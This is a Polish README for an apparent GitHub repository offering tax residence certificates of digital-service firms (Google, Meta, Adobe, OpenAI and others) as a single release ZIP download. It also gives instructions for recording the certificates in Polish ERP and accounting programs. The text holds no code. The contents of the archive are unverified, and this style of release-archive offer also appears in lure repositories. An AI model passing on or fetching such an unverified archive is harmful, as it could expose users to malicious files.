# Certyfikaty-Rezydencji-Podatkowej-WHT

Publiczne, otwarte repozytorium gromadzące aktualne i archiwalne certyfikaty rezydencji podatkowej (Certificates of Tax Residence) międzynarodowych dostawców usług cyfrowych, chmurowych, SaaS oraz marketingowych (m.in. Google Ireland, Meta Platforms Ireland, Microsoft Ireland, Adobe Systems Software Ireland, AWS European).
Projekt powstał w celu ułatwienia pracy księgowym, doradcom podatkowym, wdrożeniowcom systemów ERP oraz przedsiębiorcom realizującym obowiązki płatnika w zakresie podatku u źródła (WHT) w transakcjach transgranicznych.

---
# 📥 POBIERANIE
> [Pobierz Certyfikaty.WHT.zip](https://github.com/RooTinfinite/Certyfikaty-Rezydencji-Podatkowej-WHT/releases/download/2026/Certyfikaty.WHT.zip)
---
📌 Lista dostępnych firm
- Google
- Meta
- Adobe
- Apple
- Canva
- Github
- Linkedin
- Microsoft
- OpenAI
- Pinterest
- Tiktok
---
💻 Instrukcje wdrożenia i importu w systemach ERP / FK
Poniżej zebrano procedury ewidencji certyfikatu i parametryzacji kontrahenta w najpopularniejszych polskich programach finansowo-księgowych.
### Comarch ERP Optima


W Comarch ERP Optima certyfikat rezydencji rejestruje się bezpośrednio na kartotece kontrahenta, co zapewnia poprawne generowanie deklaracji rocznej IFT-2R.
Rejestracja danych certyfikatu:
Przejdź do: `Ogólne` ➔ `Kontrahenci`.
Otwórz kartę właściwego dostawcy (np. Google Ireland Limited) i przejdź do zakładki `Handlowe` lub `Płatności` / `WHT` (zależnie od wdrożonych modułów).
W sekcji Certyfikat rezydencji:
Zaznacz pole wyboru: `Posiada certyfikat rezydencji`.
Uzupełnij pola: `Data wydania`, `Okres obowiązywania Od – Do` (dla certyfikatów irlandzkich: standardowo dany rok podatkowy, np. `2026-01-01` do `2026-12-31`).
Wpisz `Numer certyfikatu` (Tax Reference Number lub Certificate ID z nagłówka dokumentu).
Załączenie pliku (iBard / Obieg Dokumentów DMS):
Kliknij ikonę żółtego folderu załączników (lub moduł `Comarch Obieg Dokumentów - DMS`) na formularzu kontrahenta i zaimportuj pobrany plik PDF.
Parametryzacja transakcji:
W rejestrze VAT zakupu / handlowym upewnij się, że transakcja ma przypisany kod rodzaju przychodu dla IFT-2R oraz właściwą stawkę WHT (np. 0% na podstawie DTT).

---
### enova365

W systemie enova365 obsługa WHT opiera się na definicjach podatku u źródła oraz ewidencji załączników w repozytorium DMS/Certyfikaty.
Ewidencja kontrahenta:
Przejdź do: `Ewidencja ŚŚP` ➔ `Kontrahenci` (lub `Handel` ➔ `Kontrahenci`).
Otwórz kartotekę podmiotu zagranicznego.
Przejdź do zakładki `Księgowe` ➔ sekcja Podatek u źródła (WHT):
Ustaw: `Podlega WHT` ➔ `Tak`.
Wskaż `Podstawę zwolnienia / obniżenia stawki` (np. Umowa o unikaniu podwójnego opodatkowania).
Rejestracja certyfikatu:
W zakładce `WHT` / `Certyfikaty rezydencji` kliknij `Nowy`:
`Kraj`: IE (Irlandia).
`Data wystawienia`: data z nagłówka certyfikatu.
`Ważny od / do`: okres roczny (np. 01.01.2026 – 31.12.2026).
`Forma`: Elektroniczny (oryginał).
Podpięcie pliku:
W panelu bocznym wybierz `Załączniki` (Asystent / DMS) i przeciągnij plik PDF. Zmiana statusu certyfikatu jest audytowana w historii rekordu.

---
### InsERT nexo (Subiekt nexo / Rewizor nexo)

W linii nexo podatek u źródła i zaświadczenia rezydencji powiązane są z kartoteką klienta oraz parametrami deklaracji IFT-2 / CIT-10Z.
Przejdź do: `Kartoteki` ➔ `Klienci`.
Edytuj kartotekę dostawcy i przejdź do zakładki `Księgowość` ➔ sekcja Podatek u źródła.
Zaznacz znacznik: `Stosuj preferencyjną stawkę WHT`.
W tabeli Certyfikaty rezydencji kliknij `Dodaj`:
Wprowadź `Numer dokumentu`.
Określ `Data uzyskania` oraz `Data ważności`.
Kliknij prawym przyciskiem myszy na rekordzie klienta ➔ `Dokumenty biblioteki` (lub skrót `Ctrl+Shift+B`) i zaimportuj pobrany plik PDF do bazy biblioteki załączników.

---
### InsERT GT (Subiekt GT / Rewizor GT)


W linii GT ewidencja certyfikatu odbywa się w polach dedykowanych lub za pośrednictwem pól własnych i mechanizmu biblioteki dokumentów.
Otwórz moduł: `Kartoteki` ➔ `Kontrahenci`.
Zakładka `Inne`:
W sekcji parametrów WHT zaznacz posiadanie certyfikatu i wskaż datę ważności (jeżeli wersja programu posiada dedykowaną obsługę WHT) lub odnotuj numer i datę w `Polach własnych`.

---
### Symfonia Finanse i Księgowość / ERP


W kartotece kontrahentów wybierz podmiot zagraniczny i przejdź do zakładki `Parametry podatkowe / WHT`.
Wprowadź wpis w rejestrze certyfikatów:
Numer referencyjny,
Kraj rezydencji (zgodny z prefiksem VAT UE / kodem ISO),
Zakres dat (od-do).
Podepnij dokument za pomocą modułu `Repozytorium Dokumentów Symfonia (RDS)`, przypisując go do kartoteki kontrahenta jako kategoria: Certyfikat rezydencji.

---
### Wskazówki dla systemów OCR / DMS (SaldeoSMART, Scanye itp.)


Jeśli przetwarzasz faktury kosztowe przez systemy OCR/DMS przed importem do FK:
Skonfiguruj regułę odczytu dla dostawców: `Google Ireland`, `Meta Platforms Ireland`, `Adobe Systems Software Ireland`.
Ustaw domyślne mapowanie schematu księgowego z parametrem WHT / Import usług art. 28b oraz automatycznym sprawdzaniem ważności powiązanego certyfikatu w module załączników stałych.

---
🤝 Jak dodać nowy certyfikat? (Contributing)
Sforkuj repozytorium.
Zapisz plik PDF w strukturze: `Dostawca/Pelna\_Nazwa\_Podmiotu/ROK.pdf`.

Utwórz Pull Request z opisem dodawanego podmiotu i roku podatkowego.
---
